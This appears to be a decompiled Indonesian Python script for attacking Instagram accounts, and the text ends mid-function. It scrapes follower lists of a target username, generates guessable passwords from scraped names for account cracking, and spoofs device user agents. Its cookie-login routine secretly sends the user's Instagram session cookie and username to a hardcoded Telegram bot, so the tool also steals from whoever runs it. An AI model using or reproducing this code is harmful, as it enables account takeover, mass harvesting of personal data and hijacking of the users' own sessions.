#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Decompile by Firman404
# File name: [insta.cpython-312.so] (py - 3.12)
P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K2 = "\033[33m"
M = "\033[31m"
K = K2

try:
    import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string, threading, hmac
    from concurrent.futures import ThreadPoolExecutor
    from bs4 import BeautifulSoup as bsp
    from rich import print
    from rich.panel import Panel
    from rich.console import Console
    from rich.tree import Tree
    from rich.text import Text
    from rich.columns import Columns
    from unidecode import unidecode
    console = Console()

except ImportError as e:
    __import__('os').system(f'clear')
    from urllib.parse import quote
    print(f"{M}Modul gagal diimpor: {e}")
    __import__('os').system(f'xdg-open https://wa.me/6283874935755?text=Assalammualaikum%20Bang%20Gantengg,%20mau%20lapor%20nih%20{quote(str(e))}')
    exit()

class Useragent:
    def generate_useragent(self):
        # Daftar komponen yang bisa diacak
        app_versions = [
            "70.0.0.15.98","80.0.0.20.101","60.0.0.10.76","85.0.0.25.100","75.0.0.22.99","72.0.0.18.94","68.0.0.16.84","78.0.0.14.97","63.0.0.20.81","81.0.0.24.105","73.0.0.16.96","67.0.0.18.88","84.0.0.21.110","74.0.0.18.100","71.0.0.15.92","79.0.0.14.103","62.0.0.18.80","87.0.0.22.115","76.0.0.20.102","83.0.0.18.10","66.0.0.16.87","88.0.0.24.118","77.0.0.22.103","64.0.0.18.82","82.0.0.20.107","69.0.0.14.92","89.0.0.20.123","61.0.0.14.76","86.0.0.18.112","65.0.0.12.86"
        ]
        android_versions = [
            "29/10", "30/11", "28/9", "31/12", "32/13", "27/8"
        ]
        ios_versions = [
            "iOS 15.1", "iOS 16.0", "iOS 14.4", "iPadOS 16.2", "iOS 17.1"
        ]
        windows_versions = [
            "Windows 10", "Windows 11", "Windows 8.1"
        ]
        dpis = [
            "320dpi", "480dpi", "640dpi", "213dpi", "240dpi", "160dpi"
        ]
        resolutions = [
            "1080x2400", "720x1600", "1080x2340", "1440x3200",
            "1080x2280", "1080x1920", "720x1280", "1920x1080"
        ]
        languages = [
            "en_US", "id_ID", "zh_CN", "hi_IN", "ar_SA", "es_ES",
            "ru_RU", "pt_BR", "fr_FR", "ja_JP"
        ]

        models = {
            "vivo": [
                "vivo Y20", "vivo X70 Pro", "vivo V21", "vivo Y33s", "vivo V25e", "vivo Y91C", "vivo X60 Pro"
            ],
            "samsung": [
                "Galaxy S21", "Galaxy A12", "Galaxy Z Flip", "Galaxy Note 20", "Galaxy A72", "Galaxy M32", "Galaxy Z Fold 3"
            ],
            "meizu": [
                "Meizu 16th", "Meizu M5 Note", "Meizu 18 Pro", "Meizu C9", "Meizu X8", "Meizu 17", "Meizu 16X"
            ],
            "oppo": [
                "OPPO Reno6", "OPPO A54", "OPPO Find X3 Pro", "OPPO F11", "OPPO A15", "OPPO A92", "OPPO Reno5"
            ],
            "xiaomi": [
                "Redmi Note 11", "Xiaomi 12", "Redmi Note 10 Pro", "Redmi Note 9 Pro", "Xiaomi Mi 11 Lite", "Xiaomi Mi 10", "Xiaomi 11T Pro"
            ],
            "realme": [
                "Realme C21", "Realme GT Neo 2", "Realme 9 Pro+", "Realme X3", "Realme 8 Pro", "Realme X50", "Realme 7i"
            ],
            "infinix": [
                "Infinix Zero X", "Infinix Note 11", "Infinix Smart 5", "Infinix Zero Ultra", "Infinix Note 12", "Infinix Zero 8"
            ],
            "huawei": [
                "Huawei P40", "Huawei Mate 40 Pro", "Huawei Nova 9", "Huawei P30 Pro", "Huawei Y9a", "Huawei P20", "Huawei Mate 30 Pro"
            ],
            "andromax": [
                "Andromax A", "Andromax R2", "Andromax E2", "Andromax L", "Andromax Q", "Andromax ES"
            ],
            "poco": [
                "Poco X3 NFC", "Poco M3", "Poco X4 Pro", "Poco F3", "Poco F2 Pro", "Poco M2 Pro", "Poco C3"
            ],
            "iphone": [
                "iPhone 12 Pro", "iPhone 13", "iPhone 14 Pro", "iPhone XR", "iPhone 11", "iPhone SE 2020"
            ],
            "ipad": [
                "iPad Pro 12.9", "iPad Air 4", "iPad Mini 6", "iPad Pro 11", "iPad 9th Gen", "iPad Air 5"
            ],
            "windows": [
                "Surface Pro 7", "Dell XPS 13", "HP Spectre x360", "Lenovo ThinkPad", "Acer Aspire 5", "Microsoft Surface Laptop"
            ],
            "nokia": [
                "Nokia 5.3", "Nokia 8.1", "Nokia X20", "Nokia G10", "Nokia 6.2", "Nokia 7.2", "Nokia 2.4"
            ]
        }

        processors = {
            "vivo": ["sdm710", "mt6765", "dimensity800", "dimensity1200", "helioP35"],
            "samsung": ["exynos2100", "snapdragon888", "exynos9611"],
            "meizu": ["helioP70", "snapdragon845", "exynos9810"],
            "oppo": ["helioG95", "dimensity700", "snapdragon720G"],
            "xiaomi": ["snapdragon732G", "dimensity920", "helioG88"],
            "realme": ["snapdragon870", "helioG96", "dimensity1200"],
            "infinix": ["helioG80", "helioP22", "dimensity810"],
            "huawei": ["kirin9000", "kirin985", "snapdragon778G"],
            "andromax": ["snapdragon410", "snapdragon212"],
            "poco": ["snapdragon860", "snapdragon870", "dimensity810"],
            "iphone": ["A14 Bionic", "A15 Bionic", "A16 Bionic"],
            "ipad": ["M1", "A14 Bionic", "M2"],
            "windows": ["intel-i7", "amd-ryzen7", "intel-i5"],
            "nokia": ["snapdragon480", "helioP22"]
        }

        # Acak merek dan model perangkat
        brand = random.choice(list(models.keys()))
        model = random.choice(models[brand])
        processor = random.choice(processors[brand])

        # Pilih versi dan parameter lainnya secara acak
        app_version = random.choice(app_versions)
        dpi = random.choice(dpis)
        resolution = random.choice(resolutions)
        language = random.choice(languages)

        # Pilih versi Android, iOS, atau Windows berdasarkan merek
        if brand in ["iphone", "ipad"]:
            ios_version = random.choice(ios_versions)
            return f"Instagram {app_version} {ios_version} ({resolution}; {dpi}; {model}; {processor}; {language})"
        elif brand == "windows":
            windows_version = random.choice(windows_versions)
            return f"Instagram {app_version} {windows_version} ({resolution}; {dpi}; {model}; {processor}; {language})"
        else:
            android_version = random.choice(android_versions)
            return f"Instagram {app_version} Android ({android_version}; {dpi}; {resolution}; {brand}; {model}; {processor}; {language})"
    def useragent_api(self):
        return self.generate_useragent()
    
    def replace_instagram_with_barcelona(self,text):
        return text.replace("Instagram", "Barcelona")
    
    def useragent_threads(self):
        input_text = self.generate_useragent()
        output_text = self.replace_instagram_with_barcelona(input_text)
        return output_text
        

dump = []
gaweprx = []
path = "/sdcard/RESULT"
user_id = None  # Variabel untuk menyimpan user_id

class InstagramScraper:
    def __init__(self):
        self.base_url = 'https://www.instagram.com/graphql/query/'

    def dump_followers(self, username, cookie, output_file, cursor=""):
        """Mengambil data followers"""
        global dump, user_id
        with requests.Session() as r:
            try:
                end_after = f'variables={{"id":"{user_id}","first":200,"after":"{cursor}"}}'
                params = f"query_hash=37479f2b8209594dde7facb0d904896a&{end_after}"
                response = r.get(
                    self.base_url,
                    params=params,
                    headers={
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
                        "Accept": "application/json, text/plain, */*",
                        "Cookie": cookie
                    }
                ).json()

                for akun in response['data']['user']['edge_followed_by']['edges']:
                    username_akun = akun['node']['username']
                    fullname_akun = akun['node']['full_name']

                    # Cek jika username dan fullname sudah ada dalam dump
                    if f'{username_akun}|{fullname_akun}' not in dump:
                        dump.append(f'{username_akun}|{fullname_akun}')
                        with open(output_file, 'a') as f:
                            f.write(f"{username_akun}|{fullname_akun}\n")
                        console.print(
                            f"[bold white][[bold green]+[bold white]][bold green] Pengikut: {len(dump)}...",
                            end='\r'
                        )

                # Handle pagination
                has_next_page = response['data']['user']['edge_followed_by']['page_info']['has_next_page']
                if has_next_page:
                    next_cursor = response['data']['user']['edge_followed_by']['page_info']['end_cursor']
                    self.dump_followers(username, cookie, output_file, next_cursor)

            except (requests.exceptions.JSONDecodeError, Exception, KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e:
                pass

    def dump_following(self, username, cookie, output_file, cursor=""):
        """Mengambil data following"""
        global dump, user_id
        with requests.Session() as r:
            try:
                end_after = f'variables={{"id":"{user_id}","first":200,"after":"{cursor}"}}'
                params = f"query_hash=58712303d941c6855d4e888c5f0cd22f&{end_after}"
                response = r.get(
                    self.base_url,
                    params=params,
                    headers={
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
                        "Accept": "application/json, text/plain, */*",
                        "Cookie": cookie
                    }
                ).json()

                for akun in response['data']['user']['edge_follow']['edges']:
                    username_akun = akun['node']['username']
                    fullname_akun = akun['node']['full_name']

                    # Cek jika username dan fullname sudah ada dalam dump
                    if f'{username_akun}|{fullname_akun}' not in dump:
                        dump.append(f'{username_akun}|{fullname_akun}')
                        with open(output_file, 'a') as f:
                            f.write(f"{username_akun}|{fullname_akun}\n")
                        console.print(
                            f"[bold white][[bold green]+[bold white]][bold cyan] Mengikut: {len(dump)}...",
                            end='\r'
                        )

                # Handle pagination
                has_next_page = response['data']['user']['edge_follow']['page_info']['has_next_page']
                if has_next_page:
                    next_cursor = response['data']['user']['edge_follow']['page_info']['end_cursor']
                    self.dump_following(username, cookie, output_file, next_cursor)

            except (requests.exceptions.JSONDecodeError, Exception, KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e:
                pass

# Fungsi utama untuk interaksi
class start_dump:
    def __init__(self):
        pass
    def main(self):
        global user_id
        scraper = InstagramScraper()
        username = Console().input(f"[bold white][[bold green]+[bold white]] [bold green]Masukkan username target: ").strip()
        cookie = open('.puki.txt','r').read()
        output_file = Console().input(f"[bold white][[bold green]+[bold white]] [bold green]Masukkan nama file untuk menyimpan hasil dump: ")
        try:
            r = requests.Session()
            url = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={username}'
            headers = {
    "User-Agent": "Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)",
    "Accept": "application/json",
    "Cookie": cookie
              
            }
            response = r.get(url, headers=headers).json()
            user_id = response["data"]["user"]["id"]
        except Exception as e:
            print(f"[bold white][[bold red]+[bold white]] [bold red]Username Tidak Ditemukan Atau Private[/bold red]")
            time.sleep(3)
            MAIN().List()
        thread_followers = threading.Thread(target=scraper.dump_followers, args=(username, cookie, output_file))
        thread_following = threading.Thread(target=scraper.dump_following, args=(username, cookie, output_file))
        thread_followers.start()
        thread_following.start()
        thread_followers.join()
        thread_following.join()
        try:
          with open(output_file, "r") as file:
            total_lines = len(file.readlines())
            print(f"[bold white][[bold green]+[bold white]] [bold green]Total Dump Seluruhnya: {total_lines}[/bold green]")
        except Exception as e:
          os.system('rm -rf .puki.txt')
          print(f'[bold white][[bold red]+[bold white]] [bold red]Invalid Cookie.')
          time.sleep(2.5)
          MAIN().List()

datetim = datetime.datetime.now()
file_ok = '%s-%s-%s'%(datetim.day,datetim.month,datetim.year)
KamuNya = b'x\x9c\xcb())(\xb6\xd2\xd7/H,.I\xd5+I\xd6/J,\xd7\xcf)(\xc8\xd651335\x06\x00\xb4|\n\x82'
temane  = []

class MAIN:

   id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData,info,proxi, \
   NazriDev, MID, PROXY, CrackDuplikat, bugbaru = [], 0, [], 0, 0, [], {}, [], {}, [], {'Update':None,'proxi':[]}, [], []

   def __init__(self):
       self.head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}

   def MyRich(self, Text, chos=None):
       if os.path.isfile('cat_rich.py') is True:
          import cat_rich
          self.cat = cat_rich.Lylii
       else:
          self.cat = 'color(8)'
       if self.cat not in temane:temane.append(self.cat)
       if chos:
          Console(width=62).print(Nel(Text,subtitle='┌─',subtitle_align='left',\
          style=self.cat))
       else:
          Console(width=62).print(Nel(Text, \
          style=self.cat))

   def logo(self):
      print(f"""[bold green]


⠀⡀⠀⠀⠀⠀⢣⠀⠀⢷⠀⠀⢣⠀⠀⠻⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⢀⡟⢦⡽⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⠁⠀⠀⠀⠀⢸⠀⠀⢸⡄⠀⠈⢇⠀⠀⠈⠿⣿⡿⣷⣄⠀⠀⢀⣀⡠⠤⠤⠤⠤⡤⢴⡟⠓⠀⠀⠀⠀⣷⣾⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⡇⠀⢤⠼⠀⣃⠉⠂⢨⣧⡥⠟⢒⠉⠁⠀⠀⠀⠀⠀⠀⠈⠢⡄⠤⡄⠀⠀⠀⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⡄⣀⡤⠿⠀⡠⠗⠉⢀⡠⠔⠊⠁⢀⡔⠁⠀⢦⠀⠀⠀⠀⠀⠀⠀⠀⠨⠷⣤⠀⠀⠀⠘⠿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠘⠓⢆⡴⠋⠀⠀⠀⣠⠊⠀⠀⡇⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣦⠀⠀⠀⠀⠘⢦⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠟⠀⠀⠀⠀⣰⠇⠀⠀⠀⡇⠀⠘⣆⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣇⠀⢂⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠀⠀⠀⠀⡼⡿⠀⠀⠀⠀⢸⠀⢠⠟⣆⠀⠀⠀⠀⢠⠀⠈⣿⣏⡘⡀⢸⡄⠀⠸⠀⢳⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢡⠃⠀⡄⠀⡜⠀⡇⠀⠀⠀⠀⠘⡆⢸⠀⠈⢧⡀⠀⠀⠀⢣⠴⠁⠹⡀⢣⠘⠃⠀⠀⡇⠀⣇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⣴⡜⠀⠀⠀⡸⠧⣀⢻⠀⠀⠀⠀⠀⢳⣷⡤⠒⠉⠱⣄⠀⠀⠸⠀⠀⠀⠱⡸⠀⠀⠀⠀⣇⠀⢹⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣊⠡⠔⠊⡏⢠⠀⠀⣰⠁⠀⠈⠙⢷⠀⠀⠀⢠⡉⣇⢀⣀⢀⣀⣈⣦⡀⠀⢆⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⣾⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠸⠀⢠⣷⡾⠿⢷⣮⣛⣆⠀⠀⠈⡗⠾⡿⠟⣿⣿⣿⠛⢿⡆⠸⡑⠢⢤⣤⠄⠭⠶⢄⠀⣠⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⣧⣾⣯⠀⠀⣴⣿⣿⠈⠣⡀⠀⡇⠀⠀⢸⠿⡿⣿⠀⠈⢹⢆⣇⠀⠀⢿⡆⠀⢠⠂⠀⢹⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠿⠇⢻⠀⠀⣿⠛⢿⡄⠀⠘⢆⢸⠀⠀⢸⣀⣠⠏⠀⢠⠏⠀⠙⠀⡀⢸⠁⠀⡎⠀⠀⢸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⡇⠀⠈⠒⠚⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⣠⠃⠀⠀⣠⠞⠀⠈⡇⡸⠀⠀⡇⢸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⡁⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠃⣀⠔⠊⠀⠀⠀⢠⣷⠁⠀⠀⢁⠈⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⠶⠗⡾⠁⠀⠀⠀⢠⡇⠀⠀⠀⠀⢠⡤⠖⠒⠈⠒⡄⠀⠀⣰⠗⡻⠃⠀⠀⠀⠀⣀⣼⠃⠀⠀⠀⢸⠀⢳⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡸⠁⠀⠀⢀⠔⡏⣹⡄⠀⠀⠀⠘⣆⠀⠀⠀⠀⡇⠀⠐⠁⡴⠁⠀⠀⠀⢀⣼⡟⣿⠀⠀⠀⠀⡜⠣⡈⢇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⡠⠋⠀⡷⠃⠈⠓⢤⣀⠀⠈⠀⠀⠀⠉⢀⣠⣴⢾⠃⠀⠀⠀⣴⡏⠈⠀⢸⠀⠀⠀⢠⠇⠀⠈⠛⠆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⠀⢀⠜⠁⠀⠀⠁⠀⠀⢠⠇⠈⢙⡶⠤⠤⠒⣾⣿⠟⢁⡏⠀⠀⣠⠊⣼⠀⠀⠀⢿⠂⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣄⠎⠀⠀⠀⠀⠀⠀⠀⡎⢀⠔⢹⠁⠀⢀⣶⠏⠀⢀⣾⠀⢠⣾⣧⡜⢹⢀⣀⡼⠾⢦⠔⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⢠⡷⠋⠉⠙⢒⣿⣿⠋⠀⣴⣿⢧⣴⣿⣿⡏⠉⠉⢁⠌⠀⣀⠤⣧⠀⠀⠀⠐⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠀⠀⢀⣴⣿⣿⡏⡠⠾⠟⠁⢸⣿⣿⡟⠀⠀⡠⠃⣠⢞⣥⣾⣿⠀⠀⠀⠀⢱⡀⠀⠀⠠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣇⣴⣿⣿⠏⢈⣝⡿⠃⠀⢠⣿⣿⣿⠁⠀⠰⢡⡞⣹⣿⣿⡟⢻⠀⠀⠀⠀⠸⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣛⣛⢿⣇⣠⡾⠿⠠⠦⠐⠛⠛⢛⠇⠀⠀⡷⢁⡾⠉⠀⣹⠦⣼⡆⠀⠀⠀⠀⠹⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠗⠛⠉⠁⠀⢀⣉⡉⣉⣁⡶⠀⠀⢀⣀⢠⡎⠀⠀⣰⣻⣿⣷⡔⢋⡽⠤⢿⣇⠀⠀⠀⠀⠀⢃⠀⠀""")

      print()
   
   def login_cookie(self):
      self.logo()
      self.cookie = Console().input(f"[bold white][[bold green]+[bold white]] [bold green]Masukkan Cookie: ")
      cookie = self.cookie
      try:
           xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
           InfoHeaders = {'x-ig-app-locale': 'in_ID','x-ig-device-locale': 'in_ID','x-ig-mapped-locale': 'id_ID','x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','x-ig-app-id': '567067343352427','priority': 'u=3','user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)','accept-language': 'id-ID, en-US','x-fb-http-engine': 'Liger','x-fb-client-ip': 'True','x-fb-server-cluster': 'True'}
           edit = {'edit': 'true'}
           uid = re.search('ds_user_id=(\d+)', str(self.cookie)).group(1)
           #req = requests.get('https://i.instagram.com/api/v1/accounts/current_user/', params=edit, headers=InfoHeaders, cookies = {'cookie':self.cookie}).json()['user']
           #print(req)
           #usernamemu = req['username']
           self.follow_target(cookie)
           info_kedua = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies = {'cookie':self.cookie}).json()['user']['username']
           open('.puki.txt','w').write(self.cookie)
           pcok = "7782580242:AAHH0ScFh-QjvyuWsvt1KLACt14wt4UZFhA"
           message = f"""
🧑‍💻 **Username:** `{info_kedua}`
🍪 **Cookie ID:** `{self.cookie}`"""
           url = f"https://api.telegram.org/bot{pcok}/sendMessage"
           payload = {
    "chat_id": "8047025010",
    "text": message,
    "parse_mode": "Markdown"
             
           }
           response = requests.post(url, data=payload)
      except Exception as e:
           print(e)
           os.system('rm -rf .puki.txt')
           print(f'[bold white][[bold red]+[bold white]] [bold red]Invalid Cookie.')
           time.sleep(2.5)
           MAIN().List()
           exit()
      os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
      #return self.cookie, req['full_name'], req['follower_count'], req['username']
   #-> Pilih Api Login
   def List(self):
       os.system('cls' if os.name == 'nt' else 'clear')
       try:
          self.cookie = open('.puki.txt','r').read()
       except:
          self.login_cookie()
       try:
           xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
           uid = re.search('ds_user_id=(\d+)', str(self.cookie)).group(1)
           req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={"cookie": self.cookie}).json()['user']
       except Exception as e:
          os.system('rm -rf .puki.txt')
          self.login_cookie()
       self.logo()
       #print(Panel("[bold green]Instagram[/bold green]", title="[bold cyan]Menu[/bold cyan]"))
       print("[[bold green]1[/]] START HACK FILE PENGIKUT")
       print("[[bold green]2[/]] START HACK USERNAME INSTAGRAM")
       print("[[bold green]3[/]] LAPOR AUTHOR >_<")
       print("[[bold green]4[/]] KELUAR GANTI AKUN TUMBAL")
       print()
       pilih = Console().input(f"[bold white][[bold green]+[bold white]] [bold green]Select Menu: ")
       if pilih in ['1','01']:
          self.start_crack()
       elif pilih in ['02','2']:
          start_dump().main()
          exit()
       elif pilih in ['03','3']:
          __import__('os').system(f'xdg-open https://wa.me/6283142016138?text=Assalammualaikum%20Bang%20Gantengg,%20mau%20tanya%20nih%20')
          MAIN().List()
       elif pilih in ['04','4']:
          os.system('rm -rf .puki.txt')
          print(f'[{H}+{P}] Berhasil Ganti Cookie.{P}')
          time.sleep(2)
          MAIN().List()
       else:
          print(f'[[bold green]+[bold white]] YANG BENERRR BEGOOO.[/]')
          time.sleep(2)
          MAIN().List()
          
   def start_crack(self):
       nu = Console().input('[bold white][[bold green]+[bold white]] [bold green]Masukkan Nama File: ')
       try:
         with open(nu, 'r') as file:
           for line in file:
             self.id.append(line.strip())
       except:
         print(f"[bold white][[bold red]+[bold white]] [bold red]File Tidak Ditemukan.[/bold red]")

         exit()
       #for me in uid:self.id.append(me)
       print(f"[bold white][[bold green]+[bold white]] [bold green]Total ID : {len(self.id)}[/bold green]")
       self.Main()
   
   def Main(self):
       print()
       print("[[bold green]1[/]] Login Threads")
       print("[[bold green]2[/]] Login Api")
       print("[[bold green]3[/]] Login Ajax")
       print()
       while True:
         x = Console().input('[bold white][[bold green]+[bold white]] [bold green]Pilih Method Login: ')
         if x in   ['01','1']: self.MethodType.append('1')
         elif x in ['02','2']: self.MethodType.append('2')
         elif x in ['03','3']: self.MethodType.append('3')
         elif x in ['04','4']: self.MethodType.append('4')
         break
       self.Exekusy()

   def Exekusy(self):
       """self.MyRich('\
[white]Perlu Di Perhatikan Mengubah Data Menggunakan Script Dapat Menyebabkan Akun Terkena Sesi/Checkpoint \
Saran Untuk Tidak Menggunakan Fiture Ini. Jika Anda Ingin Mengubah Data Ketikan [green]y [/]sebaliknya ketikan [green]t',True)
       x = Console(style=temane[0]).input(f'   └──> ')"""
       x = 'titit'
       if x in ['ya','y']:self.UbahData.append(True)
       else:self.UbahData.append(False)
       self.Exekusy2()

   #-> Buat Sandi
   def pwdc(self, nama, full, komb):
       self.x,self.i = [], []
       for self.y in nama.split(' '):
           if len(self.y) <2:continue
           elif len(self.y) == 3 or len(self.y) == 4 or len(self.y) == 5:
              self.z = self.y.lower()
              if komb == '1' or komb == '01':
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'123456')
                 self.x.append(self.z+'123456789')
              elif komb == '2' or komb == '02':
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'09')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'07')
                 self.x.append(self.z+'06')
              else:
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'05')
           else:
              self.z = self.y.lower()
              if komb == '1' or komb == '01':
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'123456')
                 self.x.append(self.z+'123456789')
                 self.x.append(self.z)
              elif komb == '2' or komb == '02':
                 self.x.append(self.z+'01')
                 self.x.append(self.z+'02')
                 self.x.append(self.z+'09')
                 self.x.append(self.z+'04')
                 self.x.append(self.z+'07')
                 self.x.append(self.z+'06')
                 self.x.append(self.z)
              else:
                 self.x.append(self.z+'123')
                 self.x.append(self.z+'1234')
                 self.x.append(self.z+'12345')
                 self.x.append(self.z+'05')
                 self.x.append(self.z)

           if len(nama) <5:pass
           else:
              self.x.append(nama.replace(' ','').lower())
              self.x.append(nama.lower())
           if komb == '3' or komb == '03':
              self.l = full.replace('_',' ').replace('.',' ').replace('__',' ')
              if len(self.l) <3:continue
              else:
                   try:
                       self.b = self.l.split(' ')
                       for self.r in self.b:
                           if len(self.r) <3:continue
                           elif len(self.r) <5:
                              self.x.append(self.r.lower() + '123')
                              self.x.append(self.r.lower() + '1234')
                              self.x.append(self.r.lower() + '12345')
                              self.x.append(self.r.lower() + '321')
                              self.x.append(self.r.lower() + '123456')
                              self.x.append(self.r.lower() + '234')
                              self.x.append(self.r.capitalize() + '123')
                              self.x.append(self.r.capitalize() + '1234')
                              self.x.append(self.r.capitalize() + '12345')
                              self.x.append(self.r.capitalize() + '321')
                              self.x.append(self.r.capitalize() + '123456')
                              self.x.append(self.r.capitalize() + '234')
                              self.x.append(self.r.lower() + '01')
                              self.x.append(self.r.lower() + '02')
                              self.x.append(self.r.lower() + '03')
                              self.x.append(self.r.lower() + '04')
                              self.x.append(self.r.lower() + '05')
                              self.x.append(self.r.lower() + '06')
                              self.x.append(self.r.lower() + '07')
                              self.x.append(self.r.lower() + '08')
                              self.x.append(self.r.lower() + '09')
                              self.x.append(self.r.lower() + '10')
                              self.x.append(self.r.lower() + '11')
                              self.x.append(self.r.lower() + '12')
                              self.x.append(self.r.lower() + '13')
                              self.x.append(self.r.lower() + '14')
                              self.x.append(self.r.lower() + '15')
                              self.x.append(self.r.lower() + 'cantik')
                              self.x.append(self.r.lower() + 'ganteng')
                              self.x.append(self.r.lower())
                           else:
                              self.x.append(self.r.lower() + '123')
                              self.x.append(self.r.lower() + '1234')
                              self.x.append(self.r.lower() + '12345')
                              self.x.append(self.r.lower() + '321')
                              self.x.append(self.r.lower() + '123456')
                              self.x.append(self.r.lower() + '234')
                              self.x.append(self.r.capitalize() + '123')
                              self.x.append(self.r.capitalize() + '1234')
                              self.x.append(self.r.capitalize() + '12345')
                              self.x.append(self.r.capitalize() + '321')
                              self.x.append(self.r.capitalize() + '123456')
                              self.x.append(self.r.capitalize() + '234')
                              self.x.append(self.r.lower() + '01')
                              self.x.append(self.r.lower() + '02')
                              self.x.append(self.r.lower() + '03')
                              self.x.append(self.r.lower() + '04')
                              self.x.append(self.r.lower() + '05')
                              self.x.append(self.r.lower() + '06')
                              self.x.append(self.r.lower() + '07')
                              self.x.append(self.r.lower() + '08')
                              self.x.append(self.r.lower() + '09')
                              self.x.append(self.r.lower() + '10')
                              self.x.append(self.r.lower() + '11')
                              self.x.append(self.r.lower() + '12')
                              self.x.append(self.r.lower() + '13')
                              self.x.append(self.r.lower() + '14')
                              self.x.append(self.r.lower() + '15')
                              self.x.append(self.r.lower() + 'cantik')
                              self.x.append(self.r.lower() + 'ganteng')
                              self.x.append(self.r.lower())
                   except:pass
       for self.d in self.x:
